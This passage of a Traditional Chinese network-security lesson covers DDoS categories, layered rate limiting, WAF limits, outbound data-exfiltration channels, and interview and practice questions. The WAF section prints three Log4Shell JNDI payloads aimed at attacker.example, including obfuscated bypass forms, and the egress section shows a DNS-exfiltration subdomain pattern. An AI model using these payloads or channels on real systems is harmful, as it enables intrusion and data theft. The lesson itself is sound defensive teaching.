<line x1="140" y1="80" x2="203" y2="80" class="fg-l warm"/><text x="215" y="85" text-anchor="middle" class="fg-t warm">✕</text>
<text x="215" y="110" text-anchor="middle" class="fg-t sm">分散到各節點</text>
<rect x="10" y="122" width="130" height="44" rx="6" class="fg-b warm"/><text x="75" y="141" text-anchor="middle" class="fg-t">協定型</text><text x="75" y="158" text-anchor="middle" class="fg-t sm">SYN flood</text>
<line x1="140" y1="144" x2="333" y2="144" class="fg-l warm"/><text x="345" y="149" text-anchor="middle" class="fg-t warm">✕</text>
<text x="345" y="174" text-anchor="middle" class="fg-t sm">SYN cookie</text>
<rect x="10" y="186" width="130" height="44" rx="6" class="fg-b warm"/><text x="75" y="205" text-anchor="middle" class="fg-t">應用層</text><text x="75" y="222" text-anchor="middle" class="fg-t sm">HTTP 洪水</text>
<line x1="140" y1="208" x2="463" y2="208" class="fg-l warm"/><text x="475" y="213" text-anchor="middle" class="fg-t warm">✕</text>
<text x="475" y="238" text-anchor="middle" class="fg-t sm">規則、挑戰</text>
<line x1="485" y1="208" x2="552" y2="208" class="fg-l dim dash"/><polygon points="560,208 552,203.5 552,212.5" class="fg-a"/>
<text x="615" y="204" text-anchor="middle" class="fg-t sm">漏過來的</text><text x="615" y="220" text-anchor="middle" class="fg-t sm">一小部分</text>
</svg><figcaption>越「便宜」的攻擊（純粹灌量）越早被擋下；越像正常使用者的攻擊，走得越深。所以應用層的防禦，最後一定有一部分落在你自己的程式裡。</figcaption></figure>
<h4>流量型：靠放大取勝</h4>
<p>攻擊者自己沒有幾百 Gbps，他靠的是<b>反射放大</b>（reflection amplification）：把封包的來源位址偽造成受害者，送一個小小的查詢給網路上開著的 UDP 服務，服務就把大很多的回應送給受害者。美國 CISA（當時的 US-CERT）整理過常見協定的放大倍數：</p>
<table>
<tr><th>協定</th><th>放大倍數（約）</th></tr>
<tr><td>DNS</td><td>28 到 54 倍</td></tr>
<tr><td>CLDAP</td><td>56 到 70 倍</td></tr>
<tr><td>NTP（monlist 指令）</td><td>約 557 倍</td></tr>
<tr><td>Memcached</td><td>1 萬到 5 萬倍</td></tr>
</table>
<p>算一次：攻擊者的殭屍網路只要湊出 2 Gbps 的偽造 DNS 查詢，乘上 50 倍，打到你身上就是 100 Gbps，遠超過一台伺服器網卡的 10 Gbps。2018 年 GitHub 遭受的攻擊用的就是 Memcached 放大，峰值約 1.35 Tbps。這種量在你的機房或雲端主機前面是擋不住的，只能交給有幾百 Tbps 容量、用 Anycast 把攻擊分散到全球節點的網路去吸收。根本的解法是各家網路業者在出口丟掉來源位址偽造的封包（BCP 38），但這要全世界一起做，至今仍沒做齊。</p>
<h4>協定型：耗盡「狀態」</h4>
<p>SYN flood 送大量只有 SYN 的封包，每一個都讓伺服器在半開連線表裡記一筆，等那個永遠不會來的 ACK。表滿了，正常使用者就連不進來。量不用大，耗的是記憶體裡的表格。Linux 的對策是 <b>SYN cookie</b>（<code>net.ipv4.tcp_syncookies</code>，大多數發行版預設開啟）：表快滿時不記帳，把連線資訊編碼進回給對方的序號裡，對方真的回 ACK 時再算回來。同樣的道理也適用於任何「有狀態」的設備：防火牆的連線追蹤表、NAT、負載平衡器都可能先被塞滿，所以大型服務會在邊緣用 SYN 代理先替你完成握手。</p>
<h4>應用層：長得跟正常使用者一樣</h4>
<p>每個請求都是合法的 HTTP，只是太多，或太貴。幾種典型的樣子：</p>
<ul>
<li><b>打昂貴的端點</b>：登入（密碼雜湊故意設計得很慢）、搜尋、匯出報表。每秒一千個登入請求，就可能吃滿好幾顆 CPU。</li>
<li><b>繞過快取</b>：網址加亂數參數，讓每一個請求都打到源站（第 3.8 課講過快取鍵的設定）。</li>
<li><b>慢速攻擊</b>（Slowloris）：開很多連線，每隔幾秒送一點點標頭，永遠不送完，把伺服器的連線名額佔光。對一條連線一個執行緒的伺服器特別有效。</li>
<li><b>協定實作的漏洞</b>：2023 年 10 月公開的 HTTP/2 Rapid Reset（CVE-2023-44487），用戶端開一個串流就立刻取消、再開再取消，被取消的串流不算在同時串流的上限裡，一條連線就能產生極大量的請求。Google 當時觀測到每秒約 3.98 億個請求的峰值。</li>
</ul>

<h3><span class="badge lv3">專業</span>八、速率限制要分層設計</h3>
<p>速率限制（rate limiting）最常用的演算法是<b>權杖桶</b>（token bucket）：桶子最多裝 B 個權杖，每秒補 r 個；每個請求拿走一個，桶空了就回 429。它同時允許「短時間的爆發」（最多 B 個）和「長期的平均速率」（r 個每秒）。用 B = 10、r = 2 追一次：</p>
<table>
<tr><th>時間</th><th>進來的請求</th><th>處理前的權杖</th><th>通過</th><th>拒絕（429）</th><th>剩下</th></tr>
<tr><td>0.0 秒</td><td>12</td><td>10</td><td>10</td><td>2</td><td>0</td></tr>
<tr><td>1.0 秒</td><td>1</td><td>2</td><td>1</td><td>0</td><td>1</td></tr>
<tr><td>1.5 秒</td><td>3</td><td>2</td><td>2</td><td>1</td><td>0</td></tr>
<tr><td>6.5 秒</td><td>4</td><td>10（補滿就不再加）</td><td>4</td><td>0</td><td>6</td></tr>
</table>
<p>演算法簡單，難的是「用什麼當鑰匙」。依 IP 限流有兩個大問題：很多正常使用者共用一個 IP（台灣的行動網路普遍用電信級 NAT，一個公開 IP 後面可能是成百上千支手機）；而殭屍網路的每個 IP 可能只送幾個請求，完全不會觸發門檻。所以要分層，每一層用不同的鑰匙，擋不同的東西：</p>
<figure class="figure"><svg viewBox="0 0 680 260" class="fg" style="width:100%;max-width:680px" role="img" aria-label="四層速率限制像漏斗一樣越往內越窄：邊緣依 IP、API 閘道依帳號、昂貴端點依帳號加 IP、最後是全域的同時處理數上限">
<rect x="10" y="20" width="660" height="48" rx="8" class="fg-b alt"/>
<text x="26" y="49" class="fg-t">1 邊緣 CDN／WAF</text><text x="340" y="49" text-anchor="middle" class="fg-t acc">依來源 IP</text><text x="654" y="49" text-anchor="end" class="fg-t sm">門檻寬：一個 IP 可能很多人</text>
<rect x="50" y="80" width="580" height="48" rx="8" class="fg-b alt"/>
<text x="66" y="109" class="fg-t">2 API 閘道</text><text x="340" y="109" text-anchor="middle" class="fg-t acc">依帳號或 API 金鑰</text><text x="614" y="109" text-anchor="end" class="fg-t sm">例：每帳號每秒 20 次</text>
<rect x="90" y="140" width="500" height="48" rx="8" class="fg-b"/>
<text x="106" y="169" class="fg-t">3 昂貴的端點</text><text x="340" y="169" text-anchor="middle" class="fg-t acc">依帳號＋IP</text><text x="574" y="169" text-anchor="end" class="fg-t sm">登入：15 分鐘失敗 5 次</text>
<rect x="130" y="200" width="420" height="48" rx="8" class="fg-b hot"/>
<text x="146" y="229" class="fg-t">4 全域保護</text><text x="340" y="229" text-anchor="middle" class="fg-t acc">同時處理中的請求數</text><text x="534" y="229" text-anchor="end" class="fg-t sm">滿了快速回 503</text>
</svg><figcaption>外層粗、內層細。數字只是示意，實際門檻要從你自己的正常流量量出來，例如取尖峰時段單一帳號請求數的 99 百分位再乘幾倍。</figcaption></figure>
<ul>
<li><b>第 1 層</b>在邊緣，依 IP（IPv6 要以 <code>/64</code> 為單位，因為一個使用者手上就有一整段），門檻放寬，只擋明顯的洪水。</li>
<li><b>第 2 層</b>在 API 閘道或應用程式的入口，依帳號、工作階段或 API 金鑰。這一層才對得到「人」。</li>
<li><b>第 3 層</b>針對昂貴或敏感的端點另外設：登入、寄驗證碼、搜尋、匯出。登入要同時依帳號（防猜某一個人的密碼）和依 IP（防一個 IP 試很多帳號）。</li>
<li><b>第 4 層</b>是最後的保險：限制同時處理中的請求數，滿了就立刻回 503，而不是讓請求在佇列裡排到逾時。快速失敗（load shedding）比慢慢拖垮全部好。</li>
</ul>
<p>實作細節：回 429 時加上 <code>Retry-After</code> 標頭，好的用戶端會照著退避；多台伺服器要共用計數，最常見的是放在 Redis；Redis 掛掉時，大部分端點應該<b>放行</b>（不要因為限流壞了就讓整個服務不能用），但登入這類敏感端點可以選擇保守一點。還有一個最常見的錯誤：應用程式在反向代理後面，讀到的來源 IP 全都是代理自己的位址，結果全世界共用一個桶。要設定「只信任來自已知代理的 <code>X-Forwarded-For</code>」，例如 Express 的 <code>trust proxy</code>、nginx 的 <code>set_real_ip_from</code>。</p>

<h3><span class="badge lv4">專家</span>九、WAF 能擋什麼，擋不了什麼</h3>
<p>WAF 的規則大多來自受管規則集，例如雲端業者自己的規則群組，或開源的 OWASP Core Rule Set（CRS）。CRS 用的是<b>異常分數</b>（anomaly scoring）：每條規則符合時不直接擋，而是加分，嚴重（critical）加 5、錯誤（error）加 4、警告（warning）加 3、注意（notice）加 2；一個請求的總分達到門檻（預設 5）才擋。所以一個明顯的 SQL 注入特徵就足以擋下，但單一個可疑的小特徵不會。CRS 另外有「偏執等級」（paranoia level）1 到 4：等級越高，規則越多越嚴，誤擋也越多。</p>
<p>上線 WAF 的正確順序：先開<b>計數模式</b>（count／detection only）跑一兩週，看日誌裡哪些正常請求會被擋，例如富文字編輯器送出的 HTML、含引號的搜尋字串；針對那些路徑寫排除規則；確認誤擋率可以接受，再切成阻擋模式。直接開阻擋模式，最常見的結局是客服電話爆掉，然後有人把 WAF 整個關掉。</p>
<h4>WAF 的極限</h4>
<p>WAF 是用「特徵」去比對一個它不懂的應用程式。只要攻擊不長得像特徵，它就看不見。2021 年底 Log4Shell 爆發時，最早的 WAF 規則是比對 <code>\${jndi:</code> 這個字串，幾個小時內就出現大量繞過的寫法：</p>
<pre><code>\${jndi:ldap://attacker.example/a}
\${\${lower:j}ndi:\${lower:l}dap://attacker.example/a}
\${\${::-j}\${::-n}\${::-d}\${::-i}:ldap://attacker.example/a}</code></pre>
<p>三行對 Log4j 來說是同一件事，對 WAF 來說是三個不同的字串。規則一追加，攻擊者就換一種寫法。這段時間 WAF 很有價值，因為它替你爭取到修補的時間；但真正的解法只有一個，就是升級 Log4j。</p>
<ul>
<li><b>看不懂業務邏輯</b>：把網址裡的 <code>/orders/1001</code> 改成 <code>/orders/1002</code> 去看別人的訂單（第 5.2 課的存取控制失效），對 WAF 來說是一個完美正常的請求。權限檢查只能寫在程式裡。</li>
<li><b>只看得到一部分內容</b>：大部分 WAF 只檢查請求主體的前幾 KB 到幾十 KB。把惡意內容放在一大段無害資料的後面，就可能不被檢查。檢查不到的部分要設定成「擋」還是「放行」，要自己決定。</li>
<li><b>編碼與格式</b>：JSON 裡的 Unicode 跳脫、多層 URL 編碼、GraphQL 一次送很多個查詢。WAF 和你的應用程式解析方式只要有一點不同，就有縫可鑽。</li>
<li><b>誤擋是真實成本</b>：規則越嚴，擋到的正常使用者越多。這是一個要用數據調的取捨，不是開越多越好。</li>
</ul>

<h3><span class="badge lv4">專家</span>十、出站控制：資料是從哪些縫出去的</h3>
<p>第 1.8 課的深入圖解講過出站過濾的做法：安全群組拿掉出站全開、對外走代理、DNS 也要管。這一節換成攻擊者的角度：假設他已經在應用伺服器上，手上有一份資料要送出去，他會走哪些路？</p>
<table>
<tr><th>管道</th><th>怎麼做</th><th>怎麼防、怎麼看見</th></tr>
<tr><td>直接連出去</td><td>HTTPS 送到自己的伺服器</td><td>出站只准允許清單；被擋的連線本身就是高品質的警訊</td></tr>
<tr><td>DNS</td><td>把資料切成小段，編在子網域名稱裡查詢，例如 <code>6a3f9c.x.attacker.example</code>。每個標籤最多 63 個字元，一次只能帶一百多個位元組，但慢慢送也能送完</td><td>只准用指定的解析器，在解析器上做過濾；看同一個網域的查詢量、名稱長度和亂度</td></tr>
<tr><td><b>你允許的雲端服務</b></td><td>你放行了 S3，他就把資料上傳到<b>他自己帳號</b>的儲存桶</td><td>端點政策只准存取自己組織的資源（見下面）</td></tr>
<tr><td>你允許的網站</td><td>github.com、程式碼貼上服務、公開的檔案分享站都在允許清單裡，他就用它們</td><td>代理依網域和路徑過濾；大量上傳要能被看見</td></tr>
<tr><td>應用程式自己的功能</td><td>用「匯出 CSV」「寄送報表」把資料寄給自己</td><td>業務層的稽核紀錄與異常警報</td></tr>
</table>
<p>第三列最容易被忽略。「允許連 S3」聽起來是允許連你的服務，其實是允許連<b>整個 S3</b>，包括攻擊者的儲存桶。解法是在 VPC 端點的政策裡，限定只能存取你自己組織的資源：</p>
<pre><code>{
  "Statement": [{
    "Effect": "Allow",
    "Principal": "*",
    "Action": "s3:*",
    "Resource": "*",
    "Condition": {
      "StringEquals": { "aws:ResourceOrgID": "o-a1b2c3d4e5" }
    }
  }]
}</code></pre>
<p>注意有些 AWS 自己的功能也用 S3，例如 ECR 的映像檔層、Amazon Linux 的套件庫，都放在 AWS 擁有的儲存桶裡，要另外放行，不然拉映像檔和裝套件會先壞掉。另一個常被忽略的事實：<b>隔離子網路的機器通常還是能查 DNS</b>，因為 VPC 內建的解析器會替它向外查詢。沒有路由不代表沒有出口，DNS 防火牆要一起開。</p>
<h4>出站流量也會洩漏源站位址</h4>
<p>第 3.8 課列過源站 IP 洩漏的幾種方式。從出站的角度再補幾條：你的伺服器送出的 webhook、「貼網址自動抓預覽」的功能、從網址下載頭像，對方都會看到連線的來源位址，如果那就是源站本身的 IP，躲在 CDN 後面就白費了。讓這類出站連線走另一個出口（NAT 閘道或出站代理，用不同的公開 IP）。另外，憑證透明度日誌會公開你申請過的每一個網域名稱，那些忘了放到 CDN 後面的 <code>staging.</code>、<code>old-api.</code> 子網域，常常就直接指著源站；只有 IPv4 走 CDN、IPv6 的 AAAA 紀錄卻直接指向源站，也是常見的漏洞。</p>

<h3>十一、常見誤解</h3>
<table>
<tr><th>誤解</th><th>實際上</th></tr>
<tr><td>有 VPN 就是零信任</td><td>傳統 VPN 連進來就等於進了內網，整個網段都通，這正是零信任要拿掉的那份信任。零信任是每個請求、每個應用都各自驗身分和裝置。</td></tr>
<tr><td>私有子網路的機器連不到外面</td><td>經過 NAT 就能往外連；連隔離子網路都還能查 DNS。要擋出站，得另外設計。</td></tr>
<tr><td>開了 WAF 就不用急著修漏洞</td><td>WAF 只認得特徵，換個寫法就過了。它是幫你爭取時間的安全網，不是修補。</td></tr>
<tr><td>有 CDN 就不怕 DDoS</td><td>CDN 只保護經過它的流量。源站 IP 一外洩，攻擊就繞過去了；不能快取的應用層請求，也會一路打到源站。</td></tr>
<tr><td>依 IP 限流就夠了</td><td>電信級 NAT 讓很多人共用一個 IP，殭屍網路則讓每個 IP 只送幾個請求。要再加上依帳號、依端點的限流。</td></tr>
<tr><td>安全群組寫好了，網路就安全</td><td>安全群組預設出站全開，而且它只管埠，不管身分和內容。它是很多層裡的一層。</td></tr>
</table>

<h3>十二、跟你的工作連起來</h3>
<ul>
<li><b>Node.js 和 Go 後端：</b>放在負載平衡器或 CDN 後面時，先把「真正的用戶端 IP」設定對（只信任已知代理的 <code>X-Forwarded-For</code>），限流、日誌和地區判斷才有意義。管理用的 API 不要跟公開 API 放在同一個入口。</li>
<li><b>Vue 管理後台：</b>前端的路由守衛只是使用者體驗，擋不了人。整個後台放在身分感知代理後面，API 那一側再驗一次身分和權限。CORS 也不是存取控制，它只是瀏覽器的規則，curl 不理它。</li>
<li><b>Cocos、Unity 的連線遊戲伺服器：</b>WebSocket 和 UDP 的遊戲伺服器是 DDoS 勒索的常見目標，而且一般的 HTTP CDN 保護不到 UDP。要用雲端業者的網路層防護，或支援 TCP／UDP 的代理服務。連線一建立就先驗身分權杖，驗過才配置房間和記憶體，讓沒登入的連線花不到你多少資源。</li>
<li><b>Docker：</b>用 <code>-p 5432:5432</code> 發布的埠，會繞過主機上 ufw 這類防火牆規則（第 1.8 課講過原因）。資料庫容器只綁 <code>127.0.0.1</code> 或內部網路。</li>
<li><b>雲端主機：</b>把 SSH 的 22 埠從安全群組拿掉，改用 Session Manager 或 Tailscale，是一個下午就能做完、效果很大的改進。</li>
</ul>

<h3>十三、面試會怎麼問</h3>
<p>雲端、DevOps、SRE 和資安的面試，網路安全幾乎都會考情境題。先自己講一遍，再打開參考答案。</p>
<ol>
<li>「請設計一個放網站、應用程式和資料庫的 VPC。每一層的路由和安全群組怎麼設？」</li>
<li>「零信任是什麼？它跟 VPN 有什麼不同？實作上需要哪些元件？」</li>
<li>「網站正在被 DDoS，你怎麼判斷是哪一種？各怎麼處理？」</li>
<li>「API 的速率限制你會怎麼設計？只依 IP 有什麼問題？」</li>
<li>「攻擊者已經在一台應用伺服器上執行程式了，他可以怎麼把資料送出去？你怎麼防、怎麼發現？」</li>
</ol>
<details class="reveal"><summary>看參考答案</summary>
<ol>
<li>三種子網路，各跨至少兩個可用區：公開子網路放負載平衡器和 NAT 閘道，路由表預設路由指 IGW；私有子網路放應用伺服器，預設路由指 NAT；隔離子網路放資料庫，只有 local 路由。安全群組互相指名：負載平衡器對外開 443，應用伺服器只接受負載平衡器的安全群組連 8080，資料庫只接受應用伺服器的安全群組連 5432；出站也收緊。S3 和 DynamoDB 用閘道端點，其他服務視需要加介面端點。管理用 Session Manager，不開 22。正式和開發用不同帳號。</li>
<li>零信任是不再以網路位置當信任的理由，每個請求都要驗證身分、裝置狀態，並依政策逐一授權。傳統 VPN 是驗一次就把人放進整個內網，零信任則是每個應用各自把關、權限最小、持續評估。元件有：身分提供者（SSO、MFA）、裝置管理與狀態檢查、政策引擎、政策執行點（身分感知代理或服務網格的代理），以及服務之間的工作負載身分（mTLS、SPIFFE）。後端還要驗證代理簽的 JWT，並且只接受代理來的連線。</li>
<li>看指標：網卡頻寬滿了、封包大多是 UDP 且來自 53、123、11211 這類來源埠，是流量型反射放大，要靠 CDN 或雲端業者的網路層防護吸收，自己的主機擋不住；連線表或 SYN_RECV 暴增、頻寬不大，是協定型，開 SYN cookie、讓邊緣的代理處理握手；頻寬正常但 CPU 滿、請求數暴增、集中在某些網址，是應用層，用 WAF 規則、挑戰頁面、依帳號和端點限流、加強快取，並找出哪個端點太貴。全程確認源站只接受 CDN 的流量。</li>
<li>分層：邊緣依 IP 設寬鬆的門檻擋洪水；閘道依帳號或 API 金鑰設主要的配額；登入、寄驗證碼這類昂貴或敏感的端點另外設，登入同時依帳號和 IP；最後一層限制同時處理的請求數，滿了快速回 503。演算法用權杖桶，計數放在 Redis 之類的共享儲存，回 429 加 Retry-After。只依 IP 的問題：電信級 NAT 讓很多正常使用者共用一個 IP 而被誤擋，分散式攻擊每個 IP 量很小而擋不到；另外要正確取得真實用戶端 IP。</li>
<li>管道有：直接連到攻擊者的伺服器、DNS 通道、被允許的雲端服務（上傳到他自己的 S3 儲存桶）、被允許的網站（GitHub、貼上服務）、應用程式自己的匯出或寄信功能。防法：出站預設拒絕、只開允許清單並經過代理；DNS 只走指定的解析器並開 DNS 防火牆；VPC 端點政策限定只能存取自己組織的資源；業務功能加稽核和異常警報。發現：被擋的出站連線、VPC 流量日誌裡異常的出站流量、異常的 DNS 查詢量與長度、CloudTrail 裡不尋常的資料存取。</li>
</ol>
</details>

<h3>十四、練功題（做得出來才算真的懂）</h3>
<ol>
<li>照第二節那張圖，資料庫的安全群組不小心多了一條「5432 對 0.0.0.0/0 開放」。網際網路上的人連得到資料庫嗎？如果資料庫被誤放在公開子網路呢？</li>
<li>攻擊者想用 DNS 反射放大打出 400 Gbps，放大倍數算 50 倍，他需要多少偽造的查詢流量？為什麼「網路業者在出口丟掉偽造來源的封包」能從根本解決這件事？</li>
<li>權杖桶 B = 5、r = 1 個／秒，一開始是滿的。第 0 秒來 7 個請求、第 2 秒來 3 個、第 10 秒來 6 個。每一批各通過幾個、拒絕幾個？</li>
<li>有同事說：「我們的出站代理已經只允許 <code>*.amazonaws.com</code> 了，所以資料出不去。」這句話哪裡有問題？要怎麼補？</li>
<li>一個內部後台放在 oauth2-proxy 後面，後台的程式直接讀 <code>X-Forwarded-Email</code> 標頭判斷使用者。這個設計在什麼情況下會被繞過？列出兩個修法。</li>
</ol>
<details class="reveal"><summary>看答案</summary>
<ol>
<li>連不到。資料庫在隔離子網路，路由表沒有通往 IGW 的路，資料庫也沒有公開 IP，外面的封包根本到不了，回應也出不去。這就是路由表和安全群組互相擋住對方的失誤。但如果資料庫在公開子網路、又有公開 IP，這條錯誤規則就會讓全世界都連得到 5432，這也是為什麼資料層要放在隔離子網路。</li>
<li>400 ÷ 50 = 8 Gbps 的偽造查詢。反射放大的前提是「來源位址可以偽造」，回應才會被送到受害者那裡。如果每個網路業者都在出口檢查「這個封包的來源位址真的屬於我的客戶嗎」（BCP 38），偽造的封包就出不了攻擊者的網路，反射就無從發生。問題在於只要還有一部分網路沒做，攻擊者就從那裡發。</li>
<li>第 0 秒：桶裡 5 個，通過 5、拒絕 2，剩 0。第 2 秒：補了 2 個，通過 2、拒絕 1，剩 0。第 10 秒：過了 8 秒應補 8 個，但上限是 5，所以 5 個，通過 5、拒絕 1，剩 0。</li>
<li><code>*.amazonaws.com</code> 包含所有人的 AWS 資源，攻擊者可以把資料上傳到他自己帳號的 S3 儲存桶、送到他自己的 SQS 佇列。要補的是：透過 VPC 端點存取 AWS 服務，端點政策用 <code>aws:ResourceOrgID</code> 限定只能碰自己組織的資源（再另外放行 ECR 這類 AWS 自己的儲存桶）；代理那一層也盡量把允許清單寫到具體的網域。</li>
<li>只要有人能不經過代理、直接連到後台，就能自己寫一個 <code>X-Forwarded-Email: admin@example.com</code>，變成任何人。可能的路徑包括：後台的連接埠在內網對其他機器開放、同一個叢集裡的其他 Pod、設定錯誤的負載平衡器。修法：第一，網路上讓後台只接受來自代理的連線（安全群組、NetworkPolicy，或只綁在本機）；第二，改用代理簽章的身分（例如 JWT 標頭）並在後台驗證簽章，而不是信任一個普通的文字標頭。</li>
</ol>
</details>

<h3>十五、想再挖深</h3>
<ul>
<li><b>NIST SP 800-207〈Zero Trust Architecture〉</b>：零信任的標準文件，免費下載。政策引擎、政策執行點這些名詞都出自這裡，讀完就能分辨哪些產品是真的零信任、哪些只是換了名字的 VPN。</li>
<li><b>Google 的 BeyondCorp 系列論文</b>：Google 自己寫的、從城堡模型搬到零信任的實際過程，包括他們怎麼盤點裝置、怎麼一步一步把員工從 VPN 移走。</li>
<li><b>AWS 白皮書〈AWS Best Practices for DDoS Resiliency〉</b>：把 DDoS 依層分類，對應到 CloudFront、Shield、WAF、Route 53 各擋哪一段，是第七節的官方完整版。</li>
<li><b>OWASP Core Rule Set 官方文件</b>（<a href="https://coreruleset.org/">coreruleset.org</a>）：異常分數、偏執等級、怎麼寫排除規則都有詳細說明。自己用 Docker 跑一個 ModSecurity 加 CRS，打幾個請求看分數怎麼累加，是理解 WAF 最快的方法。</li>
<li><b>Cloudflare Learning Center 的 DDoS 系列文章</b>：用很清楚的圖解釋 SYN flood、反射放大、Slowloris 等攻擊的原理，適合當作第七節的補充閱讀。</li>
</ul>
` });
